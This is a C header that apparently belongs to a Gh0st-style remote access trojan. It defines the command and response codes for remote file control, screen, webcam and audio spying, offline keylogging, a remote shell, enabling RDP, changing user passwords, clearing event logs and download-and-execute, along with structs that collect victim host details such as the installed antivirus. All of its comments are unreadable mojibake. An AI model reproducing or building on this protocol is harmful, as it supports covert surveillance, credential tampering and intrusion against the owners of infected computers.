#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

#include <winsock2.h>
//////////////////////////////////////////////////////////////////////////
enum {
    // �ļ����䷽ʽ
    TRANSFER_MODE_NORMAL = 1,    	// һ��,������ػ���Զ���Ѿ��У�ȡ��
    TRANSFER_MODE_ADDITION,			// ׷��
    TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
    TRANSFER_MODE_OVERWRITE,		// ����
    TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
    TRANSFER_MODE_JUMP,				// ����
    TRANSFER_MODE_JUMP_ALL,			// ȫ������
    TRANSFER_MODE_CANCEL,			// ȡ������
};
enum {
    COMMAND_LIST_FILES = 1,			// �г�Ŀ¼�е��ļ�
    COMMAND_DOWN_FILES,				// �����ļ�
    COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
    COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
    COMMAND_CONTINUE,				// �������������������������
    COMMAND_STOP,					// ������ֹ
    COMMAND_DELETE_FILE,			// ɾ���ļ�
    COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
    COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
    COMMAND_CREATE_FOLDER,			// �����ļ���
    COMMAND_RENAME_FILE,			// �ļ����ļ�����
    COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
    COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�
    COMMAND_FILES_SEARCH_START,     // �����ļ�
    COMMAND_FILES_SEARCH_STOP,      // ֹͣ����
    COMMAND_MOVE_DIRECTORY,         // �ƶ��ļ���
    COMMAND_MOVE_FILE,              // �ƶ��ļ�


    TOKEN_FILE_LIST,				// �ļ��б�
    TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
    TOKEN_FILE_DATA,				// �ļ�����
    TOKEN_TRANSFER_FINISH,			// �������
    TOKEN_DELETE_FINISH,			// ɾ�����
    TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
    TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
    TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
    TOKEN_DATA_CONTINUE,			// ������������
    TOKEN_RENAME_FINISH,			// �����������
    TOKEN_SEARCH_FILE_LIST,         // �����������ļ�
    TOKEN_SEARCH_FILE_FINISH,       // ȫ���������
    TOKEN_MOVE_FINISH,
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum {
    COMMAND_SCREEN_RESET = 1,			// �ı���Ļ���
    COMMAND_ALGORITHM_RESET,		// �ı��㷨
    COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
    COMMAND_SCREEN_CONTROL,			// ��Ļ����
    COMMAND_DISABLE_AERO,           // ����AERO��Ч
    COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
    COMMAND_SCREEN_BLANK,			// ����˺���
    COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
    COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
    COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����


    TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
    TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
    TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum {
    COMMAND_PSLIST = 1,					// �����б�
    COMMAND_WSLIST,					// �����б�
    COMMAND_SSLIST,                 // �û���Ϣ
    COMMAND_USLIST,                 // ϵͳ�û�
    COMMAND_ASLIST,                 // �û�״̬
    COMMAND_DSLIST,                 // ��������
    COMMAND_XLIST,                  // �����¼
    COMMAND_SOFTWARELIST,           // ����б�

    COMMAND_KILLPROCESS,			// �رս���
    COMMAND_KILLPROCESS_WINDOW,     // �رս���(����)
    COMMAND_WINDOW_TEST,            // �������ء���ԭ����󻯡���С��
    COMMAND_WINDOW_CLOSE,           // ���ڹر�

    COMMAND_ACITVEUSER,             // �����û�
    COMMAND_DISABLEEUSER,           // �����û�
    COMMAND_NET_USER,               // ��net����û�
    COMMAND_CHANGE_USERPASS,        // �����û�����
    COMMAND_DELUSER,                // ɾ���û�

    COMMAND_DISCONNECTUSER,         // �Ͽ��û�
    COMMAND_LOGOFF_USER,            // ע���û�

    COMMAND_3389_PORT,              // ����3389�˿�
    COMMAND_OPEN_3389,              // ����3389
    COMMAND_SEND_TERMSRV,           // ����˫��3389�ļ�

    COMMAND_S_SESSION,              // �Ự����

    //
    TOKEN_WSLIST,					// �����б�
    TOKEN_SSLIST,                   // ϵͳ��Ϣ
    TOKEN_USLIST,                   // ϵͳ�û�
    TOKEN_ASLIST,                   // �û�״̬
    TOKEN_XLIST,                    // ��ַ�б�
    TOKEN_DIALUPASS,                // ��������
    TOKEN_SOFTWARE,                 // �����Ϣ

    TOKEN_CPUMEMORY,                // cpu �ڴ�ʹ����
    TOKEN_CHANGE_PSAA_SUCCESS,      // �����û�����ɹ�
    TOKEN_GET_TERMSRV,              // XPϵͳ��ȡ˫��3389�ļ�
    TOKEN_TERMSRV_OK,               // ˫��3389�ɹ�
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum {
    COMMAND_WEBCAM_RESIZE = 1,    		// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
    TOKEN_WEBCAM_DIB,			    	// ����ͷ��ͼ������
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum {
    COMMAND_DELETESERVERICE = 100,       // ɾ������
    COMMAND_STARTSERVERICE,              // ��������
    COMMAND_STOPSERVERICE,               // ֹͣ����
    COMMAND_PAUSESERVERICE,              // ��ͣ����
    COMMAND_CONTINUESERVERICE,           // ��������
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum {
    COMMAND_REG_ENUM = 1,                 // ö��ע���
    COMMAND_REG_CREATEKEY,            // ����·��
    COMMAND_REG_DELKEY,               // ɾ��·��
    COMMAND_REG_CREATKEY,             // ������
    COMMAND_REG_DELVAL,               // ɾ����

    TOKEN_REG_INFO,                   // ע�����Ϣ
    TOKEN_REG_SUCCEED,                // ע���ɹ�
    TOKEN_REG_ERROR,                  // ע������
    TOKEN_REG_KEY,                    // ��ֵ����
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum {
    COMMAND_AUDIO_DATE = 1,             // ���ͱ�����������
    COMMAND_AUDIO_CHANGER,          // ���������豸
    COMMAND_AUDIO_CHANGER_LINES,    // ������������

    TOKEN_AUDIO_DATA,               // ��Ƶ����
    TOKEN_AUDIO_CHANGE_FINISH,      // �����ɹ�
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum {
    COMMAND_KEYBOARD_OFFLINE = 1,		// �������߼��̼�¼
    COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����

    TOKEN_KEYBOARD_DATA,			// ���̼�¼������
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum {
    CLEAN_EVENT_ALL = 1,
    CLEAN_EVENT_SYS,
    CLEAN_EVENT_SEC,
    CLEAN_EVENT_APP
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum {
    COMMAND_PROXY_CONNECT= 1, //socket5����
    COMMAND_PROXY_CLOSE,
    COMMAND_PROXY_DATA,

    TOKEN_PROXY_CONNECT_RESULT,
    TOKEN_PROXY_CLOSE,
    TOKEN_PROXY_DATA,
    TOKEN_PROXY_BIND_RESULT
};
//////////////////////////////////////////////////////////////////////////
enum {
    // ���ƶ˷���������

    COMMAND_SESSION = 0,			// �Ự�����ػ���������ע��, ж�أ�
    COMMAND_UNINSTALL,              // ж��
    COMMAND_RENAME_REMARK,          // ���ı�ע
    COMMAND_CHANGEDLLINFO,          // ��ѯ����
    COMMAND_CHANGE_GROUP,           // ���ķ���
    COMMAND_CLEAN_EVENT,            // ������־

    // ��������
    COMMAND_DOWN_EXEC,              // ����ִ��
    COMMAND_DOWN_UPDATE,            // ���ظ���
    COMMAND_OPEN_URL_SHOW,          // ����ҳ����ʾ��
    COMMAND_OPEN_URL_HIDE,          // ����ҳ�����أ�
    COMMAND_LOCAL_UPLOAD,           // �����ϴ�
    COMMAND_MESSAGEBOX,             // Messagebox

    // ɸѡ
    COMMAND_FIND_PROCESS,           // ���ҽ���
    COMMAND_FIND_WINDOW,            // ���Ҵ���

    COMMAND_OPEN_PROXY,             // ��������
    COMMAND_CLOSE_PROXY,            // �رմ���

    COMMAND_PRANK,                  // �� �� ��

    // ��Ҫ����
    COMMAND_NEXT = 100,				// ��һ��(���ƶ��Ѿ��򿪶Ի���)
    COMMAND_LIST_DRIVE,	            // �ļ�����(�г�����Ŀ¼)
    COMMAND_SCREEN_SPY,				// ��Ļ���
    COMMAND_WEBCAM,					// ����ͷ���
    COMMAND_AUDIO,                  // ��������
    COMMAND_SHELL,					// cmdshell
    COMMAND_SYSTEM,                 // ϵͳ����
    COMMAND_KEYBOARD,				// ���̼�¼
    COMMAND_SERVICE_MANAGER,	    // �������
    COMMAND_REGEDIT,                // ע �� ��
    COMMAND_TEXT_CHAT,              // ��������
    COMMAND_PROXY_MAP,				// proxy
    COMMAND_URL_HISTORY,		    // �������¼
    // Ԥ��
    COMMAND_PLUGINME,


    /////////////////////////////////////////////////////////////////////////////////////////

    // ����˷����ı�ʶ
    TOKEN_LOGIN = 200,				// ���߰�
    TOKEN_DRIVE_LIST,				// �ļ������������б�
    TOKEN_BITMAPINFO,				// ��Ļ��أ���Ļ�鿴��BITMAPINFO��
    TOKEN_WEBCAM_BITMAPINFO,		// ����ͷ������ͷ��BITMAPINFOHEADER��
    TOKEN_SHELL_START,              // CMD
    TOKEN_AUDIO_START,				// ��ʼ��������
    TOKEN_PSLIST,					// �����б�
    TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
    TOKEN_SERVICE_LIST,             // �����б�
    TOKEN_REGEDIT,                  // ע���ʼ
    TOKEN_TEXTCHAT_START,           // �������쿪ʼ
    TOKEN_PROXY_START,              // ����ӳ�俪ʼ

    // ����
    TOKEN_FIND_YES,                 // ���Ҵ���
    TOKEN_DLLINFO,                  // �鿴����

    // Ԥ��
};

#define MOUSE_TYPE_MOVE                 (1)
#define MOUSE_TYPE_LEFT_DOWN            (1 << 1)
#define MOUSE_TYPE_LEFT_UP              (1 << 2)
#define MOUSE_TYPE_LEFT_NDBLCLK         (1 << 3)
#define MOUSE_TYPE_RIGHT_DOWN           (1 << 4)
#define MOUSE_TYPE_RIGHT_UP             (1 << 5)
#define MOUSE_TYPE_RIGHT_NDBLCLK        (1 << 6)

struct MouseInfo {
    POINT                       m_ptCuroser;
    int                         m_Type;
};


typedef struct {
    BYTE			bToken;			// = 1
    IN_ADDR	    	IPAddress;	// �洢32λ��IPv4�ĵ�ַ���ݽṹ
    TCHAR			CPUClockMhz[50];// CPU��Ϣ
    TCHAR           szOS[50];       // ����ϵͳ
    TCHAR			HostName[50];	// ������
    TCHAR			UpGroup[50];	// ���߷���
    TCHAR           szUser[50];     // ��¼�û�
    DWORD			dwSpeed;		// ����
    bool            bIsWow64;       // �Ƿ�Ϊ64λϵͳ
    DWORD           dwMemSize;      // �ڴ��С
} LOGININFO;


//��Ϣ�б�ṹ��
struct tagSystemInfo {
    char szCpuInfo[50];   //CPU��Ϣ
    char szActiveTime[100]; //�ʱ��
    char szAntiVirus[50]; //ɱ�����
    char szUserName[50];   //��ǰ�û���
    char szPcName[50];  //�������
    char szRemotePort[10]; //Զ�̶˿�
    DWORD szMemory;         //�ڴ��С
    DWORD szMemoryFree;     //�����ڴ�
    DWORD szDriveSize;      //Ӳ�̴�С
    DWORD szDriveFreeSize;  //����Ӳ�̴�С
    char szOpenInfo[50];	// �Ƿ�˫��(�Ƿ���)
    char szDLLPath[MAX_PATH];    // �����·��
    char szScrxy[20];
};

#define	MAX_WRITE_RETRY			15 // ����д���ļ�����
#define	MAX_SEND_BUFFER			1024 * 8 // ��������ݳ���
#define MAX_RECV_BUFFER			1024 * 8 // ���������ݳ���

#endif // !defined(AFX_MACROS_H_INCLUDED)